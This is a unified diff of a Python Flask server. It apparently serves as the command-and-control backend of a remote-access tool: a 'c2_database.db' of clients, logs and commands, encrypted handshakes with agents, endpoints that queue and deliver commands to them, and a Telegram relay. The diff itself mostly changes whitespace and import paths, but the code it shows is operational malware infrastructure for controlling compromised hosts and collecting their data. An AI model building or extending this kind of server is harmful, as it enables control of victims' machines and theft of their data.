@@ -13,9 +13,9 @@ import io
 from datetime import datetime
 from functools import wraps
 from collections import defaultdict
-from modules.encryption import (
-    hybrid_decrypt_first_message,
-    hybrid_encrypt,
+from encryption import (
+    hybrid_decrypt_first_message, 
+    hybrid_encrypt, 
     hybrid_decrypt,
     aes_encrypt,
     aes_decrypt
@@ -65,13 +65,13 @@ def rate_limit(f):
     def decorated(*args, **kwargs):
         ip = request.remote_addr
         now = time.time()
-
+        
         rate_limits[ip] = [t for t in rate_limits[ip] if now - t < RATE_LIMIT_WINDOW]
-
+        
         if len(rate_limits[ip]) >= RATE_LIMIT_REQUESTS:
             logger.warning(f"Rate limit exceeded for {ip}")
             return jsonify({"error": "Rate limit exceeded"}), 429
-
+        
         rate_limits[ip].append(now)
         return f(*args, **kwargs)
     return decorated
@@ -82,7 +82,7 @@ DB_PATH = 'c2_database.db'
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-
+    
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS clients (
             id TEXT PRIMARY KEY,
@@ -92,7 +92,7 @@ def init_db():
             ip_address TEXT
         )
     ''')
-
+    
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -103,7 +103,7 @@ def init_db():
             chat_id TEXT
         )
     ''')
-
+    
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS commands (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -115,7 +115,7 @@ def init_db():
             executed_at REAL
         )
     ''')
-
+    
     conn.commit()
     conn.close()
     logger.info("✅ Database initialized")
@@ -164,11 +164,11 @@ def load_data_from_db():
     try:
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
-
+        
         cursor.execute('SELECT id, last_seen FROM clients')
         for row in cursor.fetchall():
             clients[row[0]] = {"last_seen": row[1]}
-
+        
         cursor.execute('SELECT timestamp, type, data, client_id, chat_id FROM logs ORDER BY id DESC LIMIT 1000')
         for row in cursor.fetchall():
             log_entry = {
@@ -181,11 +181,11 @@ def load_data_from_db():
             if row[4]:
                 log_entry["chat_id"] = row[4]
             clients_data.append(log_entry)
-
+        
         cursor.execute('SELECT command, client_id FROM commands WHERE status = "pending"')
         for row in cursor.fetchall():
             commands.append(row[0])
-
+        
         conn.close()
         logger.info(f"📦 Loaded {len(clients)} clients, {len(clients_data)} logs, {len(commands)} commands from DB")
     except Exception as e:
@@ -220,18 +220,18 @@ def handshake():
     encrypted_key = data.get("encrypted_key")
     encrypted_data = data.get("encrypted_data")
     client_id = data.get("client_id")
-
+    
     logger.info(f"🟡 Handshake request from client: {client_id}")
-
+    
     try:
         decrypted_data, aes_key = hybrid_decrypt_first_message(encrypted_key, encrypted_data)
         sessions[client_id] = aes_key
         clients[client_id] = {"last_seen": time.time()}
         save_client_to_db(client_id, time.time())
-
+        
         clients_data.append(json.loads(decrypted_data))
         save_log_to_db(time.time(), "handshake", decrypted_data, client_id)
-
+        
         logger.info(f"✅ Handshake successful with {client_id}")
         return jsonify({"status": "success"})
     except Exception as e:
@@ -245,10 +245,10 @@ def receive_data():
     data = request.json
     client_id = data.get("client_id")
     encrypted_data = data.get("encrypted_data")
-
+    
     if client_id == "telegram":
         try:
-            from modules.crypto_utils import decrypt_data
+            from crypto_utils import decrypt_data
             raw = base64.b64decode(encrypted_data)
             decrypted_text = decrypt_data(raw).decode('utf-8')
 
@@ -265,7 +265,7 @@ def receive_data():
         except Exception as e:
             logger.error(f"Telegram Decrypt Error: {e}")
             return "Error", 400
-
+    
     if client_id not in sessions:
         test_prefixes = ("test_", "stress_test", "Test", "kali", "agent")
         if client_id.startswith(test_prefixes) or client_id in ["test_client", "kali", "agent1"]:
@@ -276,7 +276,7 @@ def receive_data():
         else:
             logger.warning(f"⚠️ No session for {client_id}")
             return "No session, need handshake", 401
-
+    
     try:
         if encrypted_data and sessions.get(client_id) and sessions[client_id] is not None:
             decrypted_str = hybrid_decrypt(sessions[client_id], encrypted_data)
@@ -289,11 +289,11 @@ def receive_data():
             logger.info(f"📄 Plain from {client_id}: {decrypted}")
             clients_data.append(decrypted)
             save_log_to_db(time.time(), "plain", json.dumps(decrypted), client_id)
-
+        
         if client_id in clients:
             clients[client_id]["last_seen"] = time.time()
             save_client_to_db(client_id, time.time())
-
+        
         return "OK"
     except Exception as e:
         logger.error(f"Decryption error: {e}")
@@ -307,7 +307,7 @@ def receive_command():
     data = request.json
     cmd = data.get("command")
     client_id = data.get("client_id", "all")
-
+    
     logger.warning(f"💀 Command received: {cmd} for {client_id}")
     commands.append(cmd)
     save_command_to_db(cmd, client_id)
@@ -331,16 +331,16 @@ def send_command():
     data = request.json
     client_id = data.get("client_id")
     command = data.get("command")
-
+    
     if client_id not in sessions:
         return "No session", 401
-
+    
     if sessions[client_id] is not None:
         encrypted_cmd = hybrid_encrypt(sessions[client_id], command)
         commands.append({"client_id": client_id, "encrypted_cmd": encrypted_cmd})
     else:
         commands.append(command)
-
+    
     save_command_to_db(command, client_id)
     logger.info(f"✅ Command stored for {client_id}")
     return "Command stored"
@@ -351,15 +351,15 @@ def send_command():
 def get_command_encrypted():
     data = request.json
     client_id = data.get("client_id")
-
+    
     if client_id not in sessions:
         return jsonify({"command": None})
-
+    
     for i, cmd in enumerate(commands):
         if isinstance(cmd, dict) and cmd.get("client_id") == client_id:
             commands.pop(i)
             return jsonify({"command": cmd["encrypted_cmd"]})
-
+    
     return jsonify({"command": None})
 
 # ======================== 7. عرض السجلات ========================
@@ -385,7 +385,7 @@ def send_to_telegram():
     data = request.json
     message = data.get("message")
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-
+    
     results = []
     for chat_id in ALL_CHATS:
         try:
@@ -393,7 +393,7 @@ def send_to_telegram():
             results.append({"chat_id": chat_id, "status": "sent"})
         except Exception as e:
             results.append({"chat_id": chat_id, "error": str(e)})
-
+    
     return jsonify({"results": results})
 
 # ======================== 10. مسح السجلات ========================
